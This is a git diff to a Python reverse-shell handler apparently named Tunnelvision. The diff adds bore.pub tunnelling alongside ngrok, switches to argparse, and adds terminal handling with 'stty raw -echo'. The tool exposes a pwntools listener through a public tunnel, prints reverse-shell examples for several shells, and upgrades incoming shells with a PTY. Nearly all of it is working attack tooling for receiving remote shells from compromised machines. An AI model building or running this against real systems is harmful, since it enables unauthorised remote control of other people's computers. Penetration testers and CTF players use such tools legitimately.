@@ -1,15 +1,21 @@
 #!/usr/bin/env python3
 
-import ngrok
+import argparse
+import atexit
 import os
+import signal
 import subprocess
 import sys
-import signal
-import atexit
 
 from dotenv import load_dotenv
 from pwnlib.tubes.listen import listen
 from time import sleep
+
+try:
+    import ngrok
+    NGROK_INSTALLED = True
+except ImportError:
+    NGROK_INSTALLED = False
 
 
 SUPPORTED_SHELLS = [
@@ -54,54 +60,8 @@ def colored_print(text: str, color: str = Colors.WHITE):
 def execute(conn: listen, cmd: str):
     """Execute a command on the remote connection"""
     conn.sendline(cmd.encode())
-    print(conn.recvline().decode())
+    print(conn.recv().decode(), end="")
     sleep(0.1)
-
-
-def parse_arguments() -> tuple[int, str, bool, bool]:
-    """Parse command line arguments"""
-    is_linux = False
-    is_windows = False
-    shell = "bash"
-
-    try:
-        port = int(sys.argv[1])
-
-        # Validate port range
-        if not (1 <= port <= 65535):
-            colored_print(f"Port must be between 1 and 65535, got: {port}", Colors.RED)
-            raise ValueError
-
-        if len(sys.argv) > 2:
-            shell = sys.argv[2].lower()
-            if shell in ("powershell", "pwsh", "cmd"):
-                shell = "powershell" if shell == "pwsh" else shell
-                is_windows = True
-            elif shell in SUPPORTED_SHELLS:
-                is_linux = True
-            else:
-                colored_print(f"Unsupported shell: {shell}", Colors.RED)
-                print()
-                raise ValueError
-    except (IndexError, ValueError):
-        colored_print(f"USAGE: {sys.argv[0]} <PORT> [SHELL]", Colors.YELLOW)
-        colored_print(
-            "  - A valid NGROK_AUTHTOKEN must be set in the environment", Colors.WHITE
-        )
-        colored_print(
-            "  - SHELL can optionally be set for the revshell examples, defaults to bash",
-            Colors.WHITE,
-        )
-        colored_print(
-            f"    - Supported shells: {', '.join(SUPPORTED_SHELLS)}", Colors.WHITE
-        )
-        colored_print(
-            "    - For Windows, set SHELL to powershell/pwsh/cmd", Colors.WHITE
-        )
-        print()
-        exit()
-
-    return port, shell, is_linux, is_windows
 
 
 def check_ngrok_auth() -> bool:
@@ -124,6 +84,53 @@ def check_ngrok_auth() -> bool:
         return False
 
     return True
+
+
+def setup_bore_tunnel(port: int, server: str = "bore.pub") -> tuple[subprocess.Popen, str, int, str]:
+    """Set up bore tunnel and return connection details"""
+    colored_print("[+] Setting up bore tunnel...", Colors.BLUE)
+
+    try:
+        # Start bore tunnel process
+        process = subprocess.Popen(
+            ["bore", "local", "--to", server, str(port)],
+            stdout=subprocess.PIPE,
+            text=True,
+        )
+        
+        # Read the output to get the port
+        try:
+            public_port = int(process.stdout.readline().split("remote_port\x1b[0m\x1b[2m=\x1b[0m")[-1])
+        except Exception as e:
+            colored_print(f"[!] Could not parse bore port from output: {e}", Colors.RED)
+            exit()
+
+    except FileNotFoundError:
+        colored_print("[!] bore command not found. Please install bore:", Colors.RED)
+        colored_print("  - Install with: cargo install bore-cli", Colors.WHITE)
+        colored_print(
+            "  - Or download from: https://github.com/ekzhang/bore/releases", Colors.WHITE
+        )
+        exit()
+    except Exception as e:
+        colored_print(f"[!] Error setting up bore tunnel: {e}", Colors.RED)
+        exit()
+
+    # Resolve the server IP
+    try:
+        ip = (
+            subprocess.check_output(("getent", "ahostsv4", server))
+            .split()[0]
+            .decode()
+        )
+    except subprocess.CalledProcessError:
+        # Fallback if getent fails (e.g., on some systems)
+        colored_print(
+            f"[!] Could not resolve IP for {server}", Colors.YELLOW
+        )
+        ip = server
+
+    return process, ip, public_port, server
 
 
 def setup_ngrok_tunnel(port: int) -> tuple[ngrok.Listener, str, int, str]:
@@ -257,6 +264,10 @@ def upgrade_linux_shell(conn: listen):
     if not upgrade_successful:
         colored_print("[!] Could not upgrade shell with PTY", Colors.YELLOW)
 
+    # Make shell echo raw characters to allow for proper terminal interaction
+    subprocess.run("stty raw -echo", shell=True)
+    execute(conn, "reset")
+
     # Set up shell improvements
     execute(conn, "alias ls='ls -lha --color=auto'")
     execute(conn, "export SHELL=bash")
@@ -271,6 +282,21 @@ def upgrade_linux_shell(conn: listen):
         colored_print("[!] Could not get terminal dimensions", Colors.YELLOW)
 
 
+def cleanup_bore(process: subprocess.Popen):
+    """Clean up bore tunnel"""
+    try:
+        process.terminate()
+        process.wait(timeout=5)
+        colored_print("\n[+] Bore tunnel closed", Colors.GREEN)
+    except subprocess.TimeoutExpired:
+        process.kill()
+        colored_print("\n[+] Bore tunnel force-closed", Colors.GREEN)
+    except Exception as e:
+        colored_print(f"[!] Error closing bore tunnel: {e}", Colors.RED)
+
+    subprocess.run("stty sane", shell=True)
+
+
 def cleanup_ngrok(public_listener: ngrok.Listener):
     """Clean up ngrok tunnel"""
     try:
@@ -279,6 +305,8 @@ def cleanup_ngrok(public_listener: ngrok.Listener):
     except Exception as e:
         colored_print(f"[!] Error closing ngrok tunnel: {e}", Colors.RED)
 
+    subprocess.run("stty sane", shell=True)
+
 
 def signal_handler(_signum: int, _frame):
     """Handle interrupt signals"""
@@ -286,16 +314,87 @@ def signal_handler(_signum: int, _frame):
     sys.exit(0)
 
 
+def parse_arguments() -> argparse.Namespace:
+    """Parse command line arguments using argparse"""
+    parser = argparse.ArgumentParser(
+        description="Tunnelvision - Automate reverse shell setup using tunnel services (ngrok or bore)",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  %(prog)s 4444                            # Use bore (default) with bash
+  %(prog)s 4444 --tunnel ngrok             # Use ngrok with bash
+  %(prog)s 4444 --shell powershell         # Use bore with PowerShell
+  %(prog)s 4444 --tunnel ngrok --shell sh  # Use ngrok with sh shell
+  %(prog)s 4444 --to my-bore-server.com    # Use custom bore server
+        """,
+    )
+
+    parser.add_argument("port", type=int, help="Local port to listen on (1-65535)")
+
+    parser.add_argument(
+        "--tunnel",
+        "-t",
+        choices=["ngrok", "bore"],
+        default="bore",
+        help="Tunnel type to use (default: %(default)s)",
+    )
+
+    parser.add_argument(
+        "--shell",
+        "-s",
+        type=str,
+        default="bash",
+        help="Shell type for reverse shell examples (default: %(default)s)",
+    )
+
+    parser.add_argument(
+        "--to",
+        type=str,
+        default="bore.pub",
+        help="Remote server for bore tunnel (default: %(default)s). Only used with bore tunnel.",
+    )
+
+    # Validate port range
+    args = parser.parse_args()
+    if not (1 <= args.port <= 65535):
+        parser.error(f"Port must be between 1 and 65535, got: {args.port}")
+
+    return args
+
+
 def main():
     # Set up signal handlers for cleanup
     signal.signal(signal.SIGINT, signal_handler)
     signal.signal(signal.SIGTERM, signal_handler)
 
-    port, shell, is_linux, is_windows = parse_arguments()
-    public_listener, ip, public_port, hostname = setup_ngrok_tunnel(port)
+    args = parse_arguments()
+    if args.tunnel == "ngrok" and not NGROK_INSTALLED:
+        colored_print("[!] ngrok not found. Please install ngrok:", Colors.RED)
+        colored_print("  - Install with: pip install ngrok", Colors.WHITE)
+        exit()
 
-    # Register cleanup function for ngrok listener
-    atexit.register(lambda: cleanup_ngrok(public_listener))
+    # Determine shell type and platform
+    shell = args.shell
+    is_linux = False
+    is_windows = False
+
+    if shell in ("powershell", "pwsh", "cmd"):
+        shell = "powershell" if shell == "pwsh" else shell
+        is_windows = True
+    elif shell in SUPPORTED_SHELLS:
+        is_linux = True
+    else:
+        colored_print(f"[!] Shell \"{shell}\" is unknown but will be shown in the examples.", Colors.YELLOW)
+        colored_print(f"[!] Shell will not be attempted upgraded.", Colors.YELLOW)
+        print()
+
+    # Set up tunnel based on selected type and register cleanup functions
+    if args.tunnel == "bore":
+        tunnel_obj, ip, public_port, hostname = setup_bore_tunnel(args.port, args.to)
+        atexit.register(lambda: cleanup_bore(tunnel_obj))
+    else:
+        tunnel_obj, ip, public_port, hostname = setup_ngrok_tunnel(args.port)
+        atexit.register(lambda: cleanup_ngrok(tunnel_obj))
 
     colored_print(f"[+] Listening at {ip}:{public_port} ({hostname})...", Colors.GREEN)
     print()
@@ -305,7 +404,7 @@ def main():
     colored_print("    Press Ctrl+C to exit", Colors.CYAN)
 
     try:
-        conn = listen(port).wait_for_connection()
+        conn = listen(args.port).wait_for_connection()
         colored_print("[+] Connection received!", Colors.GREEN)
 
         if is_linux:
